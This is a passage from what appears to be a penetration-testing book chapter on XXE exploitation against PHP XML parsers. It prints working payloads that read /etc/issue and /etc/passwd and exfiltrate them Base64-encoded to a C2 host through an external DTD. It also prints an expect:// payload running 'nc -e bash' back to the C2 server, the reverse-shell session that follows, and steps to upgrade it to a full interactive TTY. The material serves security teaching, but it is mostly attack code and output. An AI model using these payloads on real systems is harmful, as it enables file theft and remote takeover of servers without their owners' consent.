class="literal">&lt;xxe&gt;&amp;exfil;&lt;/xxe&gt;</code> tag, we take an out-of-band approach? Since we cannot return data in the browser, we can ask the parser to connect to a C2 server and append the data to the URL. This will allow us to retrieve the contents by analyzing the C2 server's access logs.</p><p>We know we can Base64-encode the contents of a file with a stream filter. Let's combine these two and attempt to send our data to our C2 instead of the web browser.</p><p>The entities we need to define in our XML payload will look something like this:</p><div class="informalexample"><pre class="programlisting">&lt;!ENTITY % data SYSTEM "<span class="strong"><strong>php://filter/convert.base64-encode/resource=file:///etc/issue</strong></span>"&gt;
&lt;!ENTITY % conn "&lt;!ENTITY exfil SYSTEM '<span class="strong"><strong>http://c2.spider.ml/exfil?%data;</strong></span>'&gt;"&gt;</pre></div><p>A keen eye will notice the new percent character preceding the entity names. This denotes a parameter entity as opposed to a general entity, as we've used so far. General entities can be referenced somewhere in the root element tree, while parameter entities can be referenced in the DTD or the header of the document:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc">Parameter entities are prefixed with a percent character (<code class="literal">%</code>)</li><li class="listitem" style="list-style-type: disc">General entities are prefixed with an ampersand character (<code class="literal">&amp;</code>)</li></ul></div><p>The next step is to try these two entities in our previous payload:</p><div class="informalexample"><pre class="programlisting">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;
&lt;!DOCTYPE xxe [
  &lt;!ELEMENT xxe ANY &gt;
  &lt;!ENTITY % data SYSTEM "<span class="strong"><strong>php://filter/convert.base64-encode/resource=file:///etc/issue</strong></span>"&gt;
  &lt;!ENTITY % conn "&lt;!ENTITY exfil SYSTEM '<span class="strong"><strong>http://c2.spider.ml/exfil?%data;</strong></span>'&gt;"&gt;
  <span class="strong"><strong>%conn;</strong></span>
]&gt;
&lt;xxe&gt;&amp;exfil;&lt;/xxe&gt;</pre></div><p>As you can see, we<a id="id539" class="indexterm"/> are defining the <code class="literal">%data</code> and <code class="literal">%conn</code> parameter entities in our <code class="literal">DOCTYPE</code>. The <code class="literal">%conn</code> entity also defines a general entity, <code class="literal">&amp;exfil</code>, which will attach the Base64-encoded <code class="literal">%data</code> entity to our C2 URL for exfiltration.</p><p>Immediately <a id="id540" class="indexterm"/>following the parameter entity definition, we evaluate <code class="literal">%conn</code>, which will kickstart the data collection and encoding. This will also define <code class="literal">&amp;exfil</code>, which is later called in the body of the document.</p><p>Simply put, the vulnerable XML parser will perform the following:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc">Attempt to expand <code class="literal">%data</code> and, by extension, grab the contents of the <code class="literal">/etc/issue</code> file</li><li class="listitem" style="list-style-type: disc">Use the <code class="literal">php://filter</code> scheme to encode the contents of <code class="literal">/etc/issue</code></li><li class="listitem" style="list-style-type: disc">Attempt to expand <code class="literal">%conn</code> and, by extension, connect to our C2 server, <code class="literal">c2.spider.ml</code></li><li class="listitem" style="list-style-type: disc">Pass the Base64 contents of <code class="literal">%data</code> via the URL</li></ul></div><p>Unfortunately, the payload will not work as is due to XML standard restrictions. References to parameter entities (such as <code class="literal">%data</code> and <code class="literal">%conn</code>) are not allowed in the markup declarations. We have to use an external DTD to define these.</p><p>We can check our payload for errors locally using the <code class="literal">xmllint</code> Linux command, as shown:</p><div class="informalexample"><pre class="programlisting">root@kali:/tools# xmllint payload.xml
payload.xml:5: parser error : <span class="strong"><strong>PEReferences forbidden in internal subset</strong></span>
  &lt;!ENTITY % conn "&lt;!ENTITY exfil SYSTEM 'http://c2.spider.ml/exfil?%data;'&gt;"&gt;
                                                                 ^
payload.xml:5: parser warning : not validating will not read content for PE entity data
  &lt;!ENTITY % conn "&lt;!ENTITY exfil SYSTEM 'http://c2.spider.ml/exfil?%data;'&gt;"&gt;
                                                                 ^
payload.xml:6: parser error : PEReference: %conn; not found
    %conn;
          ^
payload.xml:8: parser error : Entity 'exfil' not defined
&lt;xxe&gt;&amp;exfil;&lt;/xxe&gt;
            ^</pre></div><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note63"/>Note</h3><p>
<code class="literal">xmllint</code> is available in the <code class="literal">libxml2-utils</code> package on Debian-based distributions, such as Kali.</p></div></div><p>The workaround is easy<a id="id541" class="indexterm"/> enough. We will store the entity declarations for <code class="literal">%data</code> and <code class="literal">%conn</code> on our C2<a id="id542" class="indexterm"/> server in an external DTD file:</p><div class="informalexample"><pre class="programlisting">root@spider-c2-1:~/c2/xxe# cat <span class="strong"><strong>payload.dtd</strong></span>
&lt;!ENTITY % data SYSTEM "<span class="strong"><strong>php://filter/convert.base64-encode/resource=file:///etc/issue</strong></span>"&gt;
&lt;!ENTITY % conn "&lt;!ENTITY exfil SYSTEM '<span class="strong"><strong>http://c2.spider.ml/exfil?%data;</strong></span>'&gt;"&gt;</pre></div><p>We will also setup a simple web server to provide <code class="literal">payload.dtd</code> to our target using the <code class="literal">php -S</code> command, as shown:</p><div class="informalexample"><pre class="programlisting">root@spider-c2-1:~/c2/xxe# php -S 0.0.0.0:80
PHP 7.0.27-0+deb9u1 Development Server started
Listening on http://0.0.0.0:80
Document root is /root/c2/xxe
Press Ctrl-C to quit.</pre></div><p>The modified payload will look like this:</p><div class="informalexample"><pre class="programlisting">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;
&lt;!DOCTYPE xxe [
    &lt;!ELEMENT xxe ANY &gt;
    &lt;!ENTITY % dtd SYSTEM "<span class="strong"><strong>http://c2.spider.ml/payload.dtd</strong></span>"&gt;
    <span class="strong"><strong>%dtd;</strong></span>
    <span class="strong"><strong>%conn;</strong></span>
]&gt;
&lt;xxe&gt;<span class="strong"><strong>&amp;exfil;</strong></span>&lt;/xxe&gt;</pre></div><p>The only real difference here is that we moved our two parameter entity declarations into an external DTD and we are now referencing it in our XML <code class="literal">DOCTYPE</code>.</p><p>As expected, our XML data did not generate any errors and it did not return any data either. We are flying blind:</p><div class="mediaobject"><img src="graphics/B09238_10_18.jpg" alt="Blind XXE"/><div class="caption"><p>Figure 10.18: The modified XML exploit code</p></div></div><p>However, on the <code class="literal">c2.spider.ml C2 server</code>, we can see the two HTTP requests coming in from the target:</p><div class="informalexample"><pre class="programlisting">root@spider-c2-1:~/c2/xxe# php -S 0.0.0.0:80
PHP 7.0.27-0+deb9u1 Development Server started
Listening on http://0.0.0.0:80
Document root is /root/c2/xxe
Press Ctrl-C to quit.
[] 107.181.189.72:42582 [200]: <span class="strong"><strong>/payload.dtd</strong></span>
[] 107.181.189.72:42584 [404]: <span class="strong"><strong>/exfil?S2FsaSBHTlUvTGludXggUm9sbGluZyBcbiBcbAo=</strong></span>
[...]</pre></div><p>The first request<a id="id543" class="indexterm"/> comes in for the <code class="literal">payload.dtd</code> file; this means we have confirmed the XXE vulnerability. The contents <a id="id544" class="indexterm"/>are processed and the subsequent call to the <code class="literal">exfil</code> URL containing our data shows up in the logs almost immediately.</p><p>Using CyberChef once more, Base64-decoding the URL data results in the contents of the <code class="literal">/etc/issue</code> file on the XML parser application server:</p><div class="mediaobject"><img src="graphics/B09238_10_19.jpg" alt="Blind XXE"/><div class="caption"><p>Figure 10.19: CyberChef decoding Base64 exfiltrated data</p></div></div><p>This method of exfiltration works great for smaller files, however, there may be issues with sending a large Base64 chunk over HTTP. Most clients, such as PHP or Java, will not make requests with URLs longer than around 2,000 characters. In some cases, up to 4,000 characters may be allowed. It varies greatly between client implementations, so whenever you're trying to steal some data with XXE, keep these limits in mind.</p></div><div class="section" title="Remote code execution"><div class="titlepage"><div><div><h2 class="title"><a id="ch10lvl2sec49"/>Remote code execution</h2></div></div></div><p>Ah, yes, the holy grail <a id="id545" class="indexterm"/>of penetration testing. While much less common, remote<a id="id546" class="indexterm"/> code execution is possible in certain XXE-vulnerable application deployments. Lax configuration and vulnerable components could allow us to abuse the XML parser, leading to remote code execution.</p><p>In the previous examples, we leveraged a fairly simple payload to read data from the disk:</p><div class="informalexample"><pre class="programlisting">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;
&lt;!DOCTYPE xxe [
  &lt;!ELEMENT xxe ANY &gt;
  &lt;!ENTITY exfil SYSTEM "file://<span class="strong"><strong>/etc/passwd</strong></span>"&gt;
]&gt;
&lt;xxe&gt;<span class="strong"><strong>&amp;exfil;</strong></span>&lt;/xxe&gt;</pre></div><p>Once parsed, the <code class="literal">&lt;xxe&gt;</code> tag would contain the contents of the <code class="literal">/etc/passwd</code> file. Asking PHP to execute code is not much more difficult thanks to PHP's <code class="literal">expect</code> module. Although not typically <a id="id547" class="indexterm"/>deployed by default, the <code class="literal">expect</code> extension provides <a id="id548" class="indexterm"/>PHP applications with an <code class="literal">expect://</code> wrapper, allowing developers to execute shell commands through a URL-like syntax.</p><p>Much like the <code class="literal">file://</code> wrapper, <code class="literal">expect://</code> provides read and write access to the PTY stream, as opposed to the filesystem. Developers can use the <code class="literal">fopen</code> function with an <code class="literal">expect://</code> wrapper to execute commands and retrieve their output:</p><div class="informalexample"><pre class="programlisting">&lt;?php
$stream = fopen("expect://ssh root@remotehost uptime", "r");
?&gt;</pre></div><p>The preceding code will open a read-only stream to the underlying system shell, execute the <code class="literal">ssh root@remotehost</code> command, and, once connected, the command uptime will be executed on the remotehost.</p><p>Once completed, the result can be used in the rest of the application.</p><p>When attacking XML, we don't need to execute PHP code and call the <code class="literal">fopen</code> function. The <code class="literal">expect://</code> wrapper is readily available to XML parsers.</p><p>There are advantages to using <code class="literal">expect://</code> over the built-in system <code class="literal">passthru</code> command execution, as it allows some interaction with the terminal, whereas shell <code class="literal">passthru</code> commands are more limited. For this reason, you may still encounter this module being installed and enabled.</p><p>To see this in action on a system with the <code class="literal">expect</code> module enabled, we can execute the following payload. The command we pass to <code class="literal">expect://</code> is a simple netcat bash redirector pointing to our C2 server in the cloud, <code class="literal">c2.spider.ml</code>:</p><div class="informalexample"><pre class="programlisting">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;
&lt;!DOCTYPE xxe [
  &lt;!ELEMENT xxe ANY &gt;
  &lt;!ENTITY shell SYSTEM "<span class="strong"><strong>expect://nc -e bash c2.spider.ml 443</strong></span>"&gt;
]&gt;
&lt;xxe&gt;<span class="strong"><strong>&amp;shell;</strong></span>&lt;/xxe&gt;</pre></div><p>The beauty of this is we don't necessarily care about the output. If this is a blind XXE attack, our shell will spawn just fine.</p><p>Once the XML payload is parsed and the application attempts to expand the shell entity, the <code class="literal">expect</code> module will execute our netcat command on the target and we will gain shell access to the application server:</p><div class="informalexample"><pre class="programlisting">root@spider-c2-1:~# nc -lvp 443
listening on [any] 443 ...
connect to [10.240.0.4] from [107.181.189.72] 42384
<span class="strong"><strong>id</strong></span>
<span class="strong"><strong>uid=33(www-data) gid=33(www-data) groups=33(www-data)</strong></span>
<span class="strong"><strong>pwd   </strong></span>
<span class="strong"><strong>/var/www/html/xml</strong></span>
</pre></div><p>Netcat is not the only <a id="id549" class="indexterm"/>shell option available. If we have code execution<a id="id550" class="indexterm"/> through <code class="literal">expect://</code>, we can also upload a Meterpreter payload and gain access through the Metasploit console, giving us more post-exploitation tools at our fingertips. With remote code execution, the sky is the limit.</p><div class="section" title="Interactive shells"><div class="titlepage"><div><div><h3 class="title"><a id="ch10lvl3sec10"/>Interactive shells</h3></div></div></div><p>Reverse shells<a id="id551" class="indexterm"/> over netcat are good enough to execute some commands and perhaps read files, but they don't provide interactivity. To be more productive during post-exploitation, we need access to various tools, such as Vim or SSH, which require a proper terminal.</p><p>There are a few steps we need to take, which some may call magic, in order to upgrade our shell. First, we can call <code class="literal">python</code> to spawn a new TTY bash shell. Although not perfect, it's better than what we had before:</p><div class="informalexample"><pre class="programlisting">python -c '<span class="strong"><strong>import pty; pty.spawn("/bin/bash")</strong></span>'</pre></div><p>The one-liner may look strange if you're not familiar with Python, but all it really does is import the <code class="literal">pty</code> package and spawn a bash shell.</p><p>In our reverse shell, we execute the <code class="literal">python</code> command and the result should look familiar:</p><div class="informalexample"><pre class="programlisting">root@spider-c2-1:~# nc -lvp 443
listening on [any] 443 ...
connect to [10.240.0.4] from [107.181.189.72] 42384
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
pwd   
/var/www/html/xml
<span class="strong"><strong>python -c 'import pty; pty.spawn("/bin/bash")'</strong></span>
<span class="strong"><strong>www-data$</strong></span>
</pre></div><p>There are some issues with this still: while Vim will work, there's no access to history, or <span class="emphasis"><em>Tab</em></span> completion, and <span class="emphasis"><em>Ctrl</em></span>-<span class="emphasis"><em>C</em></span> will terminate the shell.</p><p>Let's go a step further <a id="id552" class="indexterm"/>and try to upgrade to a full TTY using <code class="literal">stty</code> and the local terminal configuration.</p><p>First, once the shell is upgraded using the preceding Python one-liner, we have to send the process to the background using <span class="emphasis"><em>Ctrl</em></span>-<span class="emphasis"><em>Z</em></span>:</p><div class="informalexample"><pre class="programlisting">root@spider-c2-1:~# nc -lvp 443
listening on [any] 443 ...
connect to [10.240.0.4] from [107.181.189.72] 42384
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
pwd   
/var/www/html/xml
<span class="strong"><strong>python -c 'import pty; pty.spawn("/bin/bash")'</strong></span>
<span class="strong"><strong>www-data$ ^Z</strong></span>
<span class="strong"><strong>[1]+  Stopped                 nc -lvp 443</strong></span>
<span class="strong"><strong>root@spider-c2-1:~#</strong></span>
</pre></div><p>We need to find the current terminal type by inspecting the <code class="literal">$TERM</code> variable:</p><div class="informalexample"><pre class="programlisting">python -c 'import pty; pty.spawn("/bin/bash")'
www-data$ ^Z
[1]+  Stopped                 nc -lvp 443
root@spider-c2-1:~# <span class="strong"><strong>echo $TERM</strong></span>
<span class="strong"><strong>screen</strong></span>
</pre></div><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note64"/>Note</h3><p>Our C2 server is running in a <code class="literal">screen</code> session, but you can expect to see <code class="literal">xterm-256color</code> or Linux on a typical Kali installation.</p></div></div><p>Now, we need the configured rows and columns for the terminal display. To get these values, we use the <code class="literal">stty</code> program with the <code class="literal">-a</code> option:</p><div class="informalexample"><pre class="programlisting">root@spider-c2-1:~# stty -a
speed 38400 baud; <span class="strong"><strong>rows 43</strong></span>; <span class="strong"><strong>columns 142</strong></span>; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = &lt;undef&gt;; eol2 = &lt;undef&gt;; swtch = 
[...]</pre></div><p>The next command may seem as though it breaks the terminal, but in order to prevent <span class="emphasis"><em>Ctrl</em></span>-<span class="emphasis"><em>C</em></span> from killing our shell, we have to turn the TTY to <code class="literal">raw</code> and disable the echo of each character. The commands we input in our shell will still be processed, but the terminal itself, without a reverse shell active, may look broken.</p><p>We tell <code class="literal">stty</code> to set the terminal to <code class="literal">raw</code> and disable echo with <code class="literal">-echo</code>:</p><div class="informalexample"><pre class="programlisting">python -c 'import pty; pty.spawn("/bin/bash")'
www-data$ ^Z
[1]+  Stopped                 nc -lvp 443
root@spider-c2-1:~# echo $TERM
screen
root@spider-c2-1:~# stty -a
speed 38400 baud; rows 43; columns 142; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = &lt;undef&gt;; eol2 = &lt;undef&gt;; swtch = 
[...]
root@spider-c2-1:~# <span class="strong"><strong>stty raw -echo</strong></span>
</pre></div><p>To get our shell back<a id="id553" class="indexterm"/> from the background, we issue the <code class="literal">fg</code> command. You will notice that this is not echoed into the terminal, due to the previously issued <code class="literal">stty raw -echo</code> command, but it should still be processed:</p><div class="informalexample"><pre class="programlisting">python -c 'import pty; pty.spawn("/bin/bash")'
www-data$ ^Z
[1]+  Stopped                 nc -lvp 443
root@spider-c2-1:~# echo $TERM
screen
root@spider-c2-1:~# stty -a
speed 38400 baud; rows 43; columns 142; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = &lt;undef&gt;; eol2 = &lt;undef&gt;; swtch = 
[...]
root@spider-c2-1:~# stty raw -echo
root@spider-c2-1:~# <span class="strong"><strong>nc -lvp 443</strong></span>
</pre></div><p>Returning from the background, you will see the reverse shell command echoed back to the screen: <code class="literal">nc -lvp 443</code>, and everything may look a bit broken again. No problem– we can type <code class="literal">reset</code> to clean it up.</p><p>Inside the reverse shell, now that everything looks good again, we also need to set the same terminal options, including rows, columns, and type, in order for the shell to work properly:</p><div class="informalexample"><pre class="programlisting">www-data$ <span class="strong"><strong>export SHELL</strong></span>=<span class="strong"><strong>bash</strong></span>
www-data$ <span class="strong"><strong>export TERM</strong></span>=<span class="strong"><strong>screen</strong></span>
www-data$ <span class="strong"><strong>stty rows 43 columns 142</strong></span>
</pre></div><p>The result is a fully working terminal with all the fancy features, and yes, we can even run <code class="literal">screen</code> in our netcat reverse shell:</p><div class="mediaobject"><img src="graphics/B09238_10_20.jpg" alt="Interactive shells"/><div class="caption"><p>Figure 10.20: A fully functional interactive reverse shell</p></div></div></div></div></div>
<div class="section" title="Summary"><div class="titlepage"><div><div><h1 class="title"><a id="ch10lvl1sec60"/>Summary</h1></div></div></div><p>In this chapter, we looked at how XXE exploitation can be practical in an engagement. We then explored the potential DoS conditions that, when used with care, can provide distraction during a red-team attack.</p><p>We also examined XML-based request forgery attacks to not only perform a port scan but also chain exploits to reach vulnerable applications that we would otherwise not have access to. A more common use of XXE is to leak valuable information from the target application. We not only looked at the traditional exfiltration of data but also scenarios in which out-of-band communication was necessary. Using our cloud C2 server, we were able to exfiltrate data using a blind XXE attack.</p><p>Finally, we discovered how remote code execution can be achieved using XXE. While not as common, older application deployments may still fall victim to these types of exploits.</p><p>As shown throughout this chapter, file format parsers may seem benign, but with added features comes complexity, and complexity is, as they say, the enemy of security. XML is still everywhere and, when deployed and locked down properly, it is very powerful. Unfortunately, this is not always the case and we will be there to take advantage of every little mistake. In the upcoming chapter, we will focus our attention on APIs and how to effectively test and attack them. All of the skills you have learned up to this point will come in handy.</p></div></body></html>